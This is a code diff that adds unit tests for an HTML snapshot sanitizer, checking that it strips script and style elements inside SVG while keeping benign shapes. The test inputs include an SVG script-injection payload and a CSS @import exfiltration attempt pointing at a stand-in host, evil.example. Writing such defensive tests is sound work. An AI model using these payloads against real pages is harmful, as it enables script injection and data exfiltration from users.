@@ -47,4 +47,41 @@ describe("sanitizeSnapshotHtml", () => {
     const once = sanitizeSnapshotHtml("<div class=\"a\" onclick=\"e()\">t</div>");
     expect(sanitizeSnapshotHtml(once)).toBe(once);
   });
+
+  it("strips script elements inside SVG (namespace-aware)", () => {
+    const out = sanitizeSnapshotHtml(
+      "<svg><script>alert(1)</script><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>",
+    );
+    expect(out).not.toContain("<script>");
+    expect(out).not.toContain("alert");
+    expect(out).toContain("circle");
+  });
+
+  it("strips style elements inside SVG with @import exfil attempts", () => {
+    const out = sanitizeSnapshotHtml(
+      "<svg><style>@import url(https://evil.example/x.css)</style></svg>",
+    );
+    expect(out).not.toContain("<style>");
+    expect(out).not.toContain("@import");
+    expect(out).not.toContain("evil.example");
+  });
+
+  it("keeps benign SVG shapes (svg, circle, path, rect, g)", () => {
+    const out = sanitizeSnapshotHtml(
+      "<svg><g><circle cx=\"50\" cy=\"50\" r=\"40\"/><path d=\"M 0 0 L 10 10\"/><rect x=\"0\" y=\"0\" width=\"10\" height=\"10\"/></g></svg>",
+    );
+    expect(out).toContain("<svg");
+    expect(out).toContain("circle");
+    expect(out).toContain("path");
+    expect(out).toContain("rect");
+    expect(out).toContain("<g");
+  });
+
+  it("is idempotent on SVG with script/style stripped", () => {
+    const once = sanitizeSnapshotHtml(
+      "<svg><script>x</script><circle/></svg>",
+    );
+    expect(sanitizeSnapshotHtml(once)).toBe(once);
+    expect(once).not.toContain("<script>");
+  });
 });
